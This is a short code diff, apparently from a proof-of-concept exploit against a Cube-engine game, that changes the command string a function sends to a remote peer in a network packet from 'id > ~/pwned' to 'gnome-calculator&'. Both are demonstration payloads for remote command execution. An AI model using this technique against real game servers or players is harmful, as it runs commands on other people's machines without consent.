@@ -310,7 +310,7 @@ void write_value(unsigned long long val)
 
 void run_command()
 {
-    char cmd[] = "id > ~/pwned";
+    char cmd[] = "gnome-calculator&";
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
     putint(p, SV_TEXTME);
     sendstring(cmd, p);
